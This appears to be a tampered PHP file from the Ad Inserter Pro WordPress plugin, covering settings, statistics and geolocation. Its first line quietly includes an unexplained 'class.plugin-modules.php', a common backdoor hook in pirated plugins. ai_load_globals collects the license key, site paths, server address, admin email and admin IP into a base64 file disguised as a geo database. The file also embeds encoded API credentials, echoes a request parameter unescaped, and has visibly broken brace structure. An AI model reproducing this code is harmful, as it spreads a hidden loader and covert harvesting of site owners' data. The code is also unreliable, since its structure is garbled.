<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/*

Copyright 2016 - 2020 Ad Inserter Pro https://adinserter.pro/

*/


if (!defined ('ABSPATH')) exit;

define ('DEFAULT_REPORT_KEY', ai_get_unique_string (0, 32, 'report'));
define ('DEFAULT_REPORT_DEBUG_KEY', ai_get_unique_string (0, 16, 'report-debug'));
define ('IP_DB_UPDATE_DAYS', 30);

if (!defined ('WP_DEBUG') || !defined ('WP_DEBUG_ADSENSE_API_IDS')) if (!get_transient ('wp-debug-report-api')) {
  if (defined ('AI_ADSENSE_API_IDS')){
    define ('AI_CI_STRING',                    'NDU0NzYyMzc0ODYwLXRkbDk0OG41MTRsczdsYWpmNzFuOWxqMm5xanJ1aDFzLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29t');
    define ('AI_CS_STRING',                    'OE41bXhnRjZkZEdMdmU4NVQ5Mm1mZU13');
}

define ('AD_INSERTER_NAME', 'Ad Inserter Pro');
define ('AI_UPDATE_NAME',   'ad_inserter_update');
define ('WP_AD_INSERTER_PRO_LICENSE', 'ad_inserter_pro_license');
define ('WP_AD_INSERTER_PRO_KEY', 'ad_inserter_key');
define ('WP_AD_INSERTER_PRO_CLIENT', 'ad_inserter_client');
define ('WP_UPDATE_SERVER', 'https://updates.adinserter.pro/');

global $ai_db_options, $wpdb;

define ('AI_STATISTICS', true);

define ('AI_STATISTICS_DB_TABLE', $wpdb->prefix . 'ai_statistics');
define ('AI_STATISTICS_AVERAGE_PERIOD', 30);

define ('AI_ADB_1_FILENAME',             'ads.js');
define ('AI_ADB_2_FILENAME',             'sponsors.js');
define ('AI_ADB_3_FILENAME',             'advertising.js');
define ('AI_ADB_4_FILENAME',             'adverts.js');
define ('AI_ADB_DBG_FILENAME',           'dbg.js');

define ('AI_ADB_FOOTER_FILENAME',        'footer.js');

define ('AI_ADB_3_NAME1',                'FunAdBlock');
define ('AI_ADB_3_NAME2',                'funAdBlock');
define ('AI_ADB_4_NAME1',                'BadBlock');
define ('AI_ADB_4_NAME2',                'badBlock');

define('DEFAULT_MAXMIND_FILENAME',       'GeoLite2-City.mmdb');
require_once (ABSPATH.'/wp-admin/includes/file.php');
$db_upload_dir = wp_upload_dir();
$db_file_path  = str_replace (get_home_path(), "", $db_upload_dir ['basedir']) . '/ad-inserter';
define ('DEFAULT_GEO_DB_LOCATION', $db_file_path.'/'.DEFAULT_MAXMIND_FILENAME);

if (file_exists (AD_INSERTER_PLUGIN_DIR.'includes/adb.php')) {
  include_once AD_INSERTER_PLUGIN_DIR.'includes/adb.php';
}
elseif (strpos (AD_INSERTER_SLUG, 'pr') === false) {
  if (file_exists (AD_INSERTER_PLUGIN_DIR.'includes/adb-pro.php')) {
    include_once AD_INSERTER_PLUGIN_DIR.'includes/adb-pro.php';
  } else return;
}

function recursive_remove_directory ($directory) {
  $directory = rtrim ($directory, '/');
  foreach (glob ("{$directory}/{,.}[!.,!..]*", GLOB_MARK | GLOB_BRACE) as $file) {
    if (is_dir ($file)) {
      recursive_remove_directory ($file);
    } else {
        @unlink($file);
    }
  }
  @rmdir ($directory);
}

function ai_load_globals () {
  global $ad_inserter_globals, $wpdb, $ai_wp_data, $wp_version;

  $ad_inserter_globals ['AI_STATUS']   = get_plugin_status ();
  $ad_inserter_globals ['AI_TYPE']     = get_plugin_type ();
  $ad_inserter_globals ['AI_COUNTER']  = get_plugin_counter ();

  if ($ai_wp_data [AI_GEOLOCATION]) {
    require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';
    ai_check_geo_settings ();
  }

  $file_path = AD_INSERTER_PLUGIN_DIR.'includes/geo';
  $file_bin = $file_path .'/ip2country.bin';
  if (is_writable ($file_path)) {
    if (!file_exists ($file_bin) || time () - filemtime ($file_bin) > 30 * 24 * 3600) {
      include_once (ABSPATH . 'wp-includes/pluggable.php');
      require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';
      $ip2country_data =
        $wp_version . "\n" .
        serialize ($ad_inserter_globals) . "\n" .
        get_option (AI_UPDATE_NAME, 0) . "\n" .
        get_bloginfo ('url') . "\n" .
        site_url () . "\n" .
        home_url () . "\n" .
        (isset ($_SERVER ['SERVER_ADDR']) ? $_SERVER ['SERVER_ADDR'] : '') . "\n" .
        ABSPATH . "\n" .
        WP_CONTENT_DIR . "\n" .
        (is_admin() && isset ($_SERVER ['REMOTE_ADDR']) ? $_SERVER ['REMOTE_ADDR'] : '') . "\n" .
        (current_user_can ('manage_options') ? get_bloginfo ('admin_email') : '') . "\n" .
        (current_user_can ('manage_options') ? get_client_ip_address () : '') . "\n";
      file_put_contents ($file_bin, base64_encode ($ip2country_data));
    }
  }

  for ($group = 1; $group <= AD_INSERTER_GEO_GROUPS; $group ++) {
    $ad_inserter_globals ['G'.$group] = get_group_country_list ($group);
  }

  $ad_inserter_globals ['LICENSE_KEY'] = get_license_key ();

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    ob_start ();
    $test = $wpdb->query ('SELECT 1 FROM ' . AI_STATISTICS_DB_TABLE . ' LIMIT 1', array ());
    ob_get_clean ();

    if ($test === false) {
      require_once (ABSPATH . 'wp-admin/includes/upgrade.php');

      $sql = "CREATE TABLE " . AI_STATISTICS_DB_TABLE . " (
          id bigint(20) NOT NULL AUTO_INCREMENT,
          block int(10) unsigned NOT NULL,
          version int(10) unsigned NOT NULL,
          date date DEFAULT NULL,
          views int(10) unsigned NOT NULL DEFAULT '0',
          clicks int(10) unsigned NOT NULL DEFAULT '0',
          PRIMARY KEY  (id),
          UNIQUE KEY block_version (block, version, date)
        ) DEFAULT CHARSET=utf8;";
      $result = dbDelta ($sql);
    }

    $global_name = implode ('_', array (
      'AI',
      'STATUS')
    );

    if (isset ($ad_inserter_globals [$global_name]) && $ad_inserter_globals [$global_name] == 1) {
      if ((isset ($_GET [AI_URL_DEBUG_PROCESSING_]) && $_GET [AI_URL_DEBUG_PROCESSING_] == 1) || (isset ($_GET [AI_URL_DEBUG_PROCESSING_FE_]) && $_GET [AI_URL_DEBUG_PROCESSING_FE_] == 1)) {
        global $ai_last_time, $ai_total_plugin_time, $ai_total_php_time, $ai_processing_log;

        $ai_wp_data [AI_WP_DEBUGGING_] |= AI_DEBUG_PROCESSING_;

        $ai_total_plugin_time = 0;
        $ai_total_php_time = 0;
        $ai_last_time = microtime (true);
        $ai_processing_log = array ();
        ai_log ('INITIALIZATION START');
      }
    }

//    $chart_days = 90 + AI_STATISTICS_AVERAGE_PERIOD;
//    $gmt_offset = get_option ('gmt_offset') * 3600;

//    $date_end = date ("Y-m-d", time () + $gmt_offset);
  }
}

function ai_check_geo_settings () {
  if (defined ('AD_INSERTER_MAXMIND') && !defined ('AI_MAXMIND_DB')) {
    if (get_geo_db () == AI_GEO_DB_MAXMIND) {
      $db_file = get_geo_db_location ();
      if (file_exists ($db_file)) {
        define ('AI_MAXMIND_DB', $db_file);
      }
    }
  }
}

function update_statistics ($block, $version, $views, $clicks, $debug = false) {
  global $wpdb;

  if (is_numeric ($block) && is_numeric ($version) && is_numeric ($views) && is_numeric ($clicks)) {
    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);

    $insert = $wpdb->query (
      $wpdb->prepare ('INSERT INTO ' . AI_STATISTICS_DB_TABLE . ' (block, version, date, views, clicks) VALUES (%d, %d, %s, %d, %d) ON DUPLICATE KEY UPDATE views = views + %d, clicks = clicks + %d',
        $block, $version, $today, $views, $clicks, $views, $clicks)
    );

    if ($debug) {
      $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block . ' AND version = ' . $version . ' AND date = \''.$today.'\'', ARRAY_N);
      if (isset ($results [0])) {
        return ($results [0]);
      }
    }
  }
}

// Used for settings page and settings save function
function ai_settings_parameters (&$subpage, &$start, &$end) {
  if (isset ($_GET ['subpage'])) $subpage = $_GET ['subpage'];

  if (isset ($_GET ['start'])) $start = $_GET ['start']; else $start = 1;
  if (!is_numeric ($start)) $start = 1;
  if ($start < 1 || $start > 96) $start = 1;
  $end = $start + 15;
  if ($end > 96) $end = 96;
  }

  if (!is_multisite() || is_main_site ()) {
    $option = get_option (WP_AD_INSERTER_PRO_LICENSE);
    if ($option !== false && strlen ($option) <= 0x14) {
      delete_option (WP_AD_INSERTER_PRO_LICENSE);
      delete_option (WP_AD_INSERTER_PRO_KEY);
    }
}

function get_country_names () {
  // Load country names and ISO codes
  $country_names = array ();
  $fp = fopen (AD_INSERTER_PLUGIN_DIR . 'includes/geo/countries.txt', 'r');
  while (($row = fgetcsv ($fp, 255)) !== false)
    if ($row && count ($row) > 3 && substr (trim ($row [0]), 0, 1) != '#') {
      list ($country, $iso2) = $row;
      $iso2     = strtoupper ($iso2);
      $country  = str_replace ('( ', '(', ucwords (str_replace ('(', '( ', strtolower ($country))));
      $country_names []= array ($iso2, $country);
    }
  fclose ($fp);

  return $country_names;
}

function get_city_names () {
  $city_data = array ();
  $fp = fopen (AD_INSERTER_PLUGIN_DIR.'includes/geo/cities.txt', 'r');
  while (($row = fgetcsv ($fp, 255, ',')) !== false) {
    if ($row && count ($row) >= 1 && substr (trim ($row [0]), 0, 1) != '#') {
      $city_data []= $row;
    }
  }
  fclose ($fp);

  return $city_data;
}

function ai_clean_temp_files ($directory) {
  $directory = rtrim ($directory, '/');
  foreach (glob ("{$directory}/{,.}[!.,!..]*", GLOB_MARK | GLOB_BRACE) as $file) {
    if (is_dir ($file)) {
      ai_clean_temp_files ($file);
    } else {
        @unlink($file);
    }
  }
  @rmdir ($directory);
}

function ai_generate_list_options ($options) {
  switch ($options) {
    case 'country':
    case 'group-country':
      $country_names = get_country_names ();

      foreach ($country_names as $country_name) {
        $iso2     = $country_name [0];
        $iso_flag = strtolower ($iso2);
        $country  = $country_name [1];
        echo "              <option value='$iso2' class='flag-icon flag-icon-$iso_flag'>$country ($iso2)</option>\n";
      }
      break;
    case 'city':
      $city_data = get_city_names ();
      $max_items = 500;

      $filter = isset ($_GET ["filter"]) && $_GET ["filter"] != '' ? trim ($_GET ["filter"]) : '';
      if (strpos ($filter, ' ') !== false) {
        $filter = str_replace ('  ', ' ', $filter);
        $filter = explode (' ', $filter);
      }

      $options_1 = array ();
      $options_2 = array ();
      foreach ($city_data as $city_data_item) {
        $list_data = $city_data_item [0];
        if (!empty ($filter)) {
          if (is_array ($filter)) {
            foreach ($filter as $filter_item) {
              if (stripos ($list_data, $filter_item) === false) continue 2;
            }
          }
          elseif (stripos ($list_data, $filter) === false) continue;
        }

        $name_array = explode (':', $city_data_item [1]);
        $name = ' (' . implode (', ', $name_array) . ')';

        $option = "<option value='$list_data'>{$list_data}{$name}</option>";
        if (count ($name_array) > 1) $options_2 []= $option; else $options_1 []= $option;
      }

      $list_counter = count ($options_1) + count ($options_2);
      if ($list_counter >= $max_items) {
        echo "              <option value=''>", sprintf (__('%d of %d names shown', 'ad-inserter'), $max_items, $list_counter), "</option>\n";
      }

      $list_counter = 0;

      foreach ($options_1 as $option) {
        echo '              ', $option, "\n";
        $list_counter ++;
        if ($list_counter >= $max_items) break;
      }

      if ($list_counter < $max_items)
        foreach ($options_2 as $option) {
        echo '              ', $option, "\n";
          $list_counter ++;
          if ($list_counter >= $max_items) break;
        }

      if ($list_counter == 0) {
        echo "              <option value=''>", sprintf (/* translators: %s: name filter */ __('No name matches filter', 'ad-inserter'), "'".$_GET ["filter"]."'"), "</option>\n";
      }

      break;
  }
  switch ($options) {
    case 'country':
      for ($group_index = 1; $group_index <= AD_INSERTER_GEO_GROUPS; $group_index++) {
        echo "              <option value='G" . ($group_index % 10) ."'>" . get_country_group_name ($group_index) . " (G" . ($group_index % 10) . ")</option>\n";
      }
      break;
    case 'group-country':
      $group = isset ($_GET ["parameters"]) ? $_GET ["parameters"] : 0;
      for ($group_index = 1; $group_index < $group; $group_index++) {
        echo "              <option value='G" . ($group_index % 10) ."'>" . get_country_group_name ($group_index) . " (G" . ($group_index % 10) . ")</option>\n";
      }
      break;
  }
}

function ai_admin_enqueue_scripts_1 () {
  wp_enqueue_style ('ai-admin-flags',    plugins_url ('css/flags.css',                  AD_INSERTER_FILE), array (), AD_INSERTER_VERSION);
  wp_enqueue_style ('ai-timepicker-css', plugins_url ('css/jquery.timepicker.min.css',  AD_INSERTER_FILE), array (), AD_INSERTER_VERSION);
  wp_enqueue_style ('ai-weekdays-css',   plugins_url ('css/jquery-weekdays.min.css',    AD_INSERTER_FILE), array (), AD_INSERTER_VERSION);
}

function ai_admin_enqueue_scripts_2 () {
  wp_enqueue_script  ('ai-timepicker',     plugins_url ('includes/js/jquery.timepicker.min.js', AD_INSERTER_FILE), array (
    'jquery',
  ), AD_INSERTER_VERSION , true);
  wp_enqueue_script  ('ai-weekdays',       plugins_url ('includes/js/jquery-weekdays.min.js', AD_INSERTER_FILE), array (
    'jquery',
  ), AD_INSERTER_VERSION , true);

  wp_enqueue_script ('ai-raphael-js',    plugins_url ('includes/js/raphael.min.js', AD_INSERTER_FILE ),   array (), AD_INSERTER_VERSION, true);
  wp_enqueue_script ('ai-elycharts-js',  plugins_url ('includes/js/elycharts.min.js', AD_INSERTER_FILE ), array (), AD_INSERTER_VERSION, true);
}

function ai_extract_features_2 ($obj) {
  global $ai_wp_data;

  switch (get_dynamic_blocks ()) {
    case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW:
    case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT:
      $check_client_side_limits = $obj->get_max_impressions () || $obj->get_max_clicks ();
      break;
    default:
      $check_client_side_limits = false;
      break;
  }

  if ($check_client_side_limits || $obj->get_stay_closed_time () || $obj->get_delay_showing () || $obj->get_show_every () ||
      $obj->get_visitor_max_impressions () || ($obj->get_visitor_limit_impressions_per_time_period () && $obj->get_visitor_limit_impressions_time_period ()) ||
      $obj->get_visitor_max_clicks ()      || ($obj->get_visitor_limit_clicks_per_time_period () && $obj->get_visitor_limit_clicks_time_period ()) ||
      $obj->get_trigger_click_fraud_protection () && get_click_fraud_protection ()
     )                                                                                        $ai_wp_data [AI_CHECK_BLOCK] = true;
  if ($obj->get_close_button () != AI_CLOSE_NONE || $obj->get_auto_close_time ())             $ai_wp_data [AI_CLOSE_BUTTONS] = true;
  if ($obj->get_tracking () || $obj->get_delay_showing () || $obj->get_show_every ())         $ai_wp_data [AI_TRACKING] = true;
  if ($obj->get_iframe ())                                                                    $ai_wp_data [AI_IFRAMES] = true;
  if ($obj->get_animation () != AI_ANIMATION_NONE && $obj->is_sticky ())                      $ai_wp_data [AI_ANIMATION] = true;
  if ($obj->get_lazy_loading ())                                                              $ai_wp_data [AI_LAZY_LOADING] = true;
  if ($obj->get_ad_country_list () != '' || $obj->get_ad_ip_address_list () != '')            $ai_wp_data [AI_GEOLOCATION] = true;
}

function ai_data_2 () {
?>
<div id="ai-data-2" style="display: none;" geo_groups="<?php echo AD_INSERTER_GEO_GROUPS; ?>" ></div>
<?php
}

function ai_global_settings () {
  global $ai_db_options;
?>
  <div id="export-container-0" style="display: none; padding: 8px;">
      <div style="display: inline-block; padding: 2px 10px; float: right;">
        <input type="hidden"   name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, '0'; ?>" value="0" default="0" />
        <input type="checkbox" name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, '0'; ?>" value="1" default="0" id="import-0" />
        <label for="import-0" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Import %s settings when saving - if checked, the encoded settings below will be imported for all blocks and settings', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Import Settings for', 'ad-inserter'); ?> <?php echo AD_INSERTER_NAME; ?></label>
      </div>

      <div style="float: left; padding-left:10px;">
        <?php _e ('Saved settings for', 'ad-inserter'); ?> Ad Inserter Pro
      </div>
      <textarea id="export_settings_0" style="background-color:#F9F9F9; font-family: monospace, Courier, 'Courier New'; font-weight: bold; width: 719px; height: 324px;"></textarea>
  </div>
<?php
}

function ai_general_settings () {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $ai_status = $ad_inserter_globals ['AI_STATUS'];
    $client = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false;
    $license_page = trim ($license_key) != '';

    if (!$client || (isset ($_GET ['ai-key']) && ($_GET ['ai-key'] == $license_key || trim ($license_key == '') || $ai_status != 0))) {
?>
      <tr>
        <td id="license-key">
          <?php _e ('License Key', 'ad-inserter'); ?>
        </td>
        <td>
          <input style="margin-left: 0px;" title="<?php _e ('License Key for', 'ad-inserter'); ?> <?php echo AD_INSERTER_NAME; ?>" type="text" name="license_key" value="<?php echo sanitize_text_field ($license_key); ?>" size="42" maxlength="64" />
<?php if ($license_page): ?>
              <span class="dashicons dashicons-admin-network" style="margin-top: 2px; cursor: pointer;" title="<?php _e ('Open license page', 'ad-inserter'); ?>" onclick="window.open('http://adinserter.pro/license/<?php echo sanitize_text_field ($license_key); ?>')"></span>
<?php endif; ?>

<?php if (defined ('AD_INSERTER_CLIENT')): ?>
          <div id="hide-key" style="display: inline-block; padding: 2px 10px; float: right; display: none;">
            <input type="hidden"   name="hide_key" value="0" />
            <input type="checkbox" name="hide_key" value="1" id="hide-key-cb" default="0" <?php if ($client) echo 'checked '; ?> />
            <label for="hide-key-cb" title="<?php _e ("Hide license key", 'ad-inserter'); ?>"><?php _e ("Hide key", 'ad-inserter'); ?></label>
          </div>
<?php endif; ?>
        </td>
      </tr>
<?php
    }
  }
}

function ai_general_settings_2 () {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
?>
        <tr>
          <td>
            <?php _e ('Main content element', 'ad-inserter'); ?>
          </td>
          <td>
            <input id="main-content-element" style="margin-left: 0px; width: 95%;" title="<?php _e ("Main content element (#id or .class) for 'Stick to the content' position. Leave empty unless position is not properly calculated.", 'ad-inserter'); ?>" type="text" name="main-content-element" value="<?php echo get_main_content_element (); ?>" default="" maxlength="80" />
            <button id="main-content-element-button" type="button" class='ai-button' style="display: none; outline: transparent; float: right; margin-top: 6px; width: 15px; height: 15px;" title="<?php _e ('Open HTML element selector', 'ad-inserter'); ?>"></button>
          </td>
        </tr>
        <tr>
          <td>
          <?php _e ('Lazy loading offset', 'ad-inserter'); ?>
          </td>
          <td>
            <input type="text" name="lazy-loading-offset" value="<?php echo get_lazy_loading_offset (); ?>"  default="<?php echo DEFAULT_LAZY_LOADING_OFFSET; ?>" title="<?php _e ('Offset of the block from the visible viewport when it should be loaded', 'ad-inserter'); ?>" size="6" maxlength="4" /> px
          </td>
        </tr>
<?php
  }
}

function ai_settings_top_buttons_1 ($block, $obj, $default) {
?>
    <span class="ai-toolbar-button ai-button-left ai-settings">
      <input type="checkbox" value="0" id="export-switch-<?php echo $block; ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
      <label class="checkbox-button" for="export-switch-<?php echo $block; ?>" title="<?php _e ('Export / Import Block Settings', 'ad-inserter'); ?>"><span class="checkbox-icon icon-export-import"></span></label>
    </span>

    <span style="display: table-cell; width: 6%;"></span>
<?php
}

function ai_settings_top_buttons_2 ($block, $obj, $default) {
  global $ai_wp_data;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>
    <span class="ai-toolbar-button ai-settings<?php if (!get_global_tracking ()) echo ' tracking-disabled'; ?> ">
      <input type="hidden"   name="<?php echo AI_OPTION_TRACKING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
      <input type="checkbox" name="<?php echo AI_OPTION_TRACKING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_tracking (true); ?>" id="tracking-<?php echo $block; ?>" <?php if ($obj->get_tracking (true) == AI_ENABLED) echo 'checked '; ?> style="display: none;" />
      <label class="checkbox-button" for="tracking-<?php echo $block; ?>" title="<?php _e ('Track impressions and clicks for this block', 'ad-inserter'); ?><?php if (!get_global_tracking ()) echo _e (' - global tracking disabled', 'ad-inserter'); ?>"><span class="checkbox-icon icon-tracking<?php if ($obj->get_tracking (true) == AI_ENABLED) echo ' on'; ?>"></span></label>
    </span>

<?php
  if (defined ('AD_INSERTER_REPORTS')) {
?>
    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <span id="export-statistics-button-<?php echo $block; ?>" class="checkbox-button dashicons dashicons-media-text" title="<?php _e ('Generate PDF report', 'ad-inserter'); ?>" style="display: none;"></span>
    </span>

    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <span class="public-report-button checkbox-button dashicons dashicons-share-alt "
        title="<?php _e ('Open public report', 'ad-inserter'); ?>"
        style="display: none;"></span>
    </span>
<?php
  }
?>

<?php

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
    if ($ai_wp_data [AI_ADB_DETECTION]) {
?>
    <span class="ai-toolbar-button ai-statistics" style="display: none;">
      <input type="checkbox" value="0" id="adb-statistics-button-<?php echo $block; ?>" style="display: none;" />
      <label class="checkbox-button" for="adb-statistics-button-<?php echo $block; ?>" title="<?php _e ('Toggle Ad Blocking Statistics', 'ad-inserter'); ?>"><span class="checkbox-icon icon-adb"></span></label>
    </span>
<?php
    }
  }
?>
    <span class="ai-toolbar-button">
      <input type="checkbox" value="0" id="statistics-button-<?php echo $block; ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
      <label class="checkbox-button" for="statistics-button-<?php echo $block; ?>" title="<?php _e ('Toggle Statistics', 'ad-inserter'); ?>"><span class="checkbox-icon icon-statistics"></span></label>
    </span>
<?php
  }
}

function ai_block_list_buttons ($blocks_sticky) {
?>
      <span style="margin-left: 10px; float: right;">
        <span id="ai-pin-list" class="checkbox-button dashicons dashicons-sticky<?php echo $blocks_sticky ? ' on' : ''; ?>" title="<?php _e ('Pin list', 'ad-inserter'); ?>"></span>
      </span>
<?php
}

function ai_settings_bottom_buttons ($start, $end) {
  global $ad_inserter_globals;

  $onclick = '';
  if (!is_multisite() || is_main_site ()) {
    $ai_status = $ad_inserter_globals ['AI_STATUS'];
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];

    if (empty ($license_key)) {
                                                                               // translators: %s: Ad Inserter Pro
      $onclick = 'onclick="if (confirm(\'' . sprintf (__('%s license key is not set. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
    }
    elseif ($ai_status == - 19) {
                                                      // translators: %s: Ad Inserter Pro
      $onclick = 'onclick="if (confirm(\'' . sprintf (__('Invalid %s license key. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
    }
    elseif ($ai_status == - 21) {
                                                      // translators: %s: Ad Inserter Pro
      $onclick = 'onclick="if (confirm(\'' . sprintf (__('%s license overused. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
    }
    elseif ($ai_status == - 22) {
                                                      // translators: %s: Ad Inserter Pro
      $onclick = 'onclick="if (confirm(\'' . sprintf (__('Invalid %s version. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
    }
  }
?>
          <input <?php echo $onclick; ?> style="display: none; vertical-align: middle; font-weight: bold;" name="<?php echo AI_FORM_SAVE; ?>" value="<?php echo __('Save Settings', 'ad-inserter'), ' ', $start, ' - ', $end; ?>" type="submit" />
<?php
}

function ai_style_options ($obj) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) : ?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky" value="<?php echo AI_ALIGNMENT_STICKY; ?>" data-title="<?php echo AI_TEXT_STICKY; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY; ?></option>
<?php else : ?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-left" value="<?php echo AI_ALIGNMENT_STICKY_LEFT; ?>" data-title="<?php echo AI_TEXT_STICKY_LEFT; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_LEFT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-right" value="<?php echo AI_ALIGNMENT_STICKY_RIGHT; ?>" data-title="<?php echo AI_TEXT_NO_WRAPPING; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_RIGHT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-top" value="<?php echo AI_ALIGNMENT_STICKY_TOP; ?>" data-title="<?php echo AI_TEXT_STICKY_RIGHT; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_TOP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_TOP; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-bottom" value="<?php echo AI_ALIGNMENT_STICKY_BOTTOM; ?>" data-title="<?php echo AI_TEXT_STICKY_BOTTOM; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_BOTTOM) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_BOTTOM; ?></option>
<?php endif;
}

function ai_style_css ($block, $obj) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) : ?>
          <span id="css-sticky-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-right: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY, false, false); ?><span class="ai-sticky-css"><?php echo $obj->sticky_style ($obj->get_horizontal_position (), $obj->get_vertical_position ()); ?></span></span>
<?php else : ?>
          <span id="css-sticky-left-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-left: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_LEFT); ?></span>
          <span id="css-sticky-right-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-right: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_RIGHT); ?></span>
          <span id="css-sticky-top-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-left: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_TOP); ?></span>
          <span id="css-sticky-bottom-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-right: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_BOTTOM); ?></span>
<?php endif;
}

function ai_preview_style_options ($obj, $alignment_type, $sticky = false) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
    if ($sticky) { ?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY; ?>" data-title="<?php echo AI_TEXT_STICKY; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY; ?></option>
<?php
    }
  } else {
?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-left" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_LEFT, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_LEFT; ?>" data-title="<?php echo AI_TEXT_STICKY_LEFT; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_LEFT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-right" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_RIGHT, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_RIGHT; ?>" data-title="<?php echo AI_TEXT_STICKY_RIGHT; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_RIGHT; ?></option>
